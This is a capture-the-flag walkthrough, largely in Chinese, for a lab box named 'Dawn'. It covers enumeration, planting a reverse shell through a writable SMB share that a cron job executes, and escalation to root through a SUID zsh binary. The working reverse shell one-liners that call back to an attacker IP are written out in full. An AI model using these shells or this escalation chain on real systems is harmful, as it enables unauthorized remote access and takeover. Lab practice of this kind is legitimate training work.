# Dawn
![image](https://hackmd.io/_uploads/r1DwXyO2kg.png)

## Solution
### 1. Recon
#### 1.1 Nmap
```
┌──(chw㉿CHW)-[~]
└─$ nmap -sC -sV -T4 192.168.117.11  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-19 02:27 EDT
Nmap scan report for 192.168.117.11
Host is up (0.11s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
80/tcp   open  http        Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.38 (Debian)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
3306/tcp open  mysql       MariaDB 5.5.5-10.3.15
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.15-MariaDB-1
|   Thread ID: 15
|   Capabilities flags: 63486
|   Some Capabilities: FoundRows, InteractiveClient, Speaks41ProtocolOld, IgnoreSigpipes, DontAllowDatabaseTableColumn, SupportsTransactions, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolNew, SupportsCompression, SupportsLoadDataLocal, ODBCClient, ConnectWithDatabase, LongColumnFlag, Support41Auth, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: %RNph;.qre(2d$"|l*+9
|_  Auth Plugin Name: mysql_native_password
Service Info: Host: DAWN

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: dawn
|   NetBIOS computer name: DAWN\x00
|   Domain name: dawn
|   FQDN: dawn.dawn
|_  System time: 2025-03-19T02:27:43-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2025-03-19T06:27:42
|_  start_date: N/A
|_clock-skew: mean: 1h20m02s, deviation: 2h18m34s, median: 1s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.30 seconds
```
> Http, Mysql & Samba
#### 1.2 dirsearch
```
┌──(chw㉿CHW)-[~]
└─$ dirsearch -u http://192.168.117.11/
...
[02:32:30] 301 -  315B  - /logs  ->  http://192.168.117.11/logs/            
[02:32:30] 200 -  505B  - /logs/
```
嘗試瀏覽 http://192.168.117.11/logs/\
![image](https://hackmd.io/_uploads/HyGYrku2ke.png)
>auth.log	(403)\
daemon.log	(403)\
error.log (403)\
management.log (200)

瀏覽 `management.log`
![image](https://hackmd.io/_uploads/HkmxZb_nye.png)


#### 1.3 Enum4linux
```
┌──(chw㉿CHW)-[~]
└─$ enum4linux -a 192.168.117.11
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Mar 19 03:51:05 2025

 =========================================( Target Information )=========================================

Target ........... 192.168.117.11                                                                                                                            
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
...
 ===============================( Getting domain SID for 192.168.117.11 )===============================
                     
Domain Name: WORKGROUP                                          
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup                                                                                                
 ==================================( OS information on 192.168.117.11 )==================================

[E] Can't get OS info with smbclient                                                                     
[+] Got OS info for 192.168.117.11 from srvinfo:                                                                                                             
        DAWN           Wk Sv PrQ Unx NT SNT Samba 4.9.5-Debian                                                                                               
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03


 ======================================( Users on 192.168.117.11 )======================================
                                                                                                                                                             
Use of uninitialized value $users in print at ./enum4linux.pl line 972.                                                                                      
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 975.

Use of uninitialized value $users in print at ./enum4linux.pl line 986.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 988.

 ================================( Share Enumeration on 192.168.117.11 )================================
                                           
        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        ITDEPT          Disk      PLEASE DO NOT REMOVE THIS SHARE. IN CASE YOU ARE NOT AUTHORIZED TO USE THIS SYSTEM LEAVE IMMEADIATELY.
        IPC$            IPC       IPC Service (Samba 4.9.5-Debian)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            WIN2K3STDVIC

[+] Attempting to map shares on 192.168.117.11                                                          
...

[+] Password Info for Domain: DAWN

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: 37 days 6 hours 21 minutes 
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: 37 days 6 hours 21 minutes 

[+] Retieved partial password policy with rpcclient:                                                                   
Password Complexity: Disabled                                                                                                                                
Minimum Password Length: 5


 ======================================( Groups on 192.168.117.11 )======================================

[+] Getting builtin groups:                                 
[+]  Getting builtin group memberships:            
[+]  Getting local groups:
[+]  Getting local group memberships:    
[+]  Getting domain groups:                                                                                  
[+]  Getting domain group memberships:    

 =================( Users on 192.168.117.11 via RID cycling (RIDS: 500-550,1000-1050) )=================

[I] Found new SID:                                         
S-1-22-1                                                   
[I] Found new SID:                                         
S-1-5-32                                                   
[I] Found new SID:                                           
S-1-5-32                                                   
[I] Found new SID:                                             
S-1-5-32                                                   
[I] Found new SID:                                          
S-1-5-32 

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''                                                                                              
S-1-5-32-544 BUILTIN\Administrators (Local Group)                                                                                                            
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

[+] Enumerating users using SID S-1-5-21-4292367078-475864837-953252120 and logon username '', password ''                                               
S-1-5-21-4292367078-475864837-953252120-501 DAWN\nobody (Local User) 
```
> `//192.168.117.11/ITDEPT Mapping: OK Listing: OK Writing: N/A`\
> `ITDEPT`: 共享目錄可讀 (Mapping: OK, Listing: OK, Writing: N/A)，但不能寫入

### 2. Smbclient
使用 smbclient 來看該共享目錄:
```
┌──(chw㉿CHW)-[~]
└─$ smbclient -N //192.168.117.11/ITDEPT   

Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Aug  2 23:23:20 2019
  ..                                  D        0  Wed Jul 22 13:19:41 2020

                7158264 blocks of size 1024. 3518852 blocks available
smb: \> 
```
> 空的？！ 也可能是權限不足

🥚 從 `management.log` 可以得知 cron 不斷重複執行 `/home/dawn/ITDEPT/product-control`  和 `/home/dawn/ITDEPT/web-control`

### 3. Reverse Shell
塞入一個名為 `product-control` 或 `web-control` 的 reverse shell
>[!Warning]
>嘗試了 Tcp 與 Udp 都失敗：\
>`bash -c 'bash -i >& /dev/tcp/192.168.45.214/8888 0>&1'`\
>`bash -i > /dev/udp/192.168.45.214/8888 0>&1`
```
┌──(chw㉿CHW)-[~]
└─$ echo "python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("192.168.45.214",8888)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'" >> web-control
```
開啟 netcat 監聽：
```
┌──(chw㉿CHW)-[~]
└─$ nc -nvlp 8888                  
listening on [any] 8888 ...

```
### 4. 上傳 reverse shell script
```
smb: \> put web-control
putting file web-control as \web-control (0.1 kb/s) (average 0.1 kb/s)
smb: \> ls
  .                                   D        0  Wed Mar 19 04:40:29 2025
  ..                                  D        0  Wed Jul 22 13:19:41 2020
  web-control                         A       50  Wed Mar 19 04:40:29 2025

                7158264 blocks of size 1024. 3518828 blocks available
smb: \> !bash web-control

```
> 等待 cron 執行\
> [選] `!bash web-control`: 也可直接執行 web-control

(Kali)
```
┌──(chw㉿CHW)-[~]
└─$ nc -nvlp 8888
listening on [any] 8888 ...

connect to [192.168.45.214] from (UNKNOWN) [192.168.117.11] 34666
/bin/sh: 0: can't access tty; job control turned off
$ $ hostname
dawn
$ whoami
www-data
$ 

```
### ✅ Get User Flag
> 在 `/home/dawn`找到 User flag
## Privileges Escalation
### 1. Sudo -l
```
www-data@dawn:/home/dawn$ sudo -l
sudo -l
Matching Defaults entries for www-data on dawn:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on dawn:
    (root) NOPASSWD: /usr/bin/sudo
www-data@dawn:/home/dawn$ sudo su
sudo su

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

sudo: no tty present and no askpass program specified
```
> sudo 不用密碼，但需要 Tty

### 2. 重建 Reverse shell
嘗試在 Reverse shell 中直接建立 Tty\
另建 `product-control` 可以同時兩個 Reverse shell
```
┌──(chw㉿CHW)-[~]
└─$ cat product-control
python3 -c 'import socket,subprocess,os,pty; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("192.168.45.214",6666)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); pty.spawn("/bin/bash")'
                  
┌──(chw㉿CHW)-[~]
└─$ nc -nvlp 6666                  
listening on [any] 6666 ...

```
(Smbclient)
```
smb: \> put product-control
putting file product-control as \product-control (0.7 kb/s) (average 0.7 kb/s)
smb: \> ls -l product-control 
NT_STATUS_NO_SUCH_FILE listing \-l
```
### 3. 重試 Sudo -l
```
┌──(chw㉿CHW)-[~]
└─$ nc -nvlp 6666                  
listening on [any] 6666 ...
connect to [192.168.45.214] from (UNKNOWN) [192.168.117.11] 54742
dawn@dawn:~$ id
id
uid=1000(dawn) gid=1000(dawn) groups=1000(dawn),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),115(lpadmin),116(scanner)
dawn@dawn:~$ whoami
whoami
dawn
dawn@dawn:~$ cd /root
cd /root
bash: cd: /root: Permission denied
dawn@dawn:~$ sudo -l
sudo -l
Matching Defaults entries for dawn on dawn:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User dawn may run the following commands on dawn:
    (root) NOPASSWD: /usr/bin/mysql
dawn@dawn:~$ 
```
> (root) NOPASSWD: /usr/bin/mysql

#### 4. GTFO: mysql
查詢 [GTFO](https://gtfobins.github.io/gtfobins/mysql/)
```
dawn@dawn:~$ sudo mysql -e '\! /bin/sh'
sudo mysql -e '\! /bin/sh'
ERROR 1045 (28000): Access denied for user 'root'@'localhost' (using password: NO)
```
> MySQL root 使用者需要密碼\
> (失敗)

#### 5. SUID
```
dawn@dawn:~$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/sbin/mount.cifs
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/su
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/mount
/usr/bin/zsh
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/fusermount
/usr/bin/umount
/usr/bin/chfn
```
#### 6. zsh
```
dawn@dawn:~$ /usr/bin/zsh
/usr/bin/zsh
dawn# whoami                                                                   
whoami
root
dawn# cd /root

cd /root
dawn# ls                                                                       
ls
flag.txt  proof.txt
dawn# cat flag.txt                                                             
cat flag.txt
Your flag is in another file...
dawn# cat proof.txt
```
### ✅ Get Root FLAG
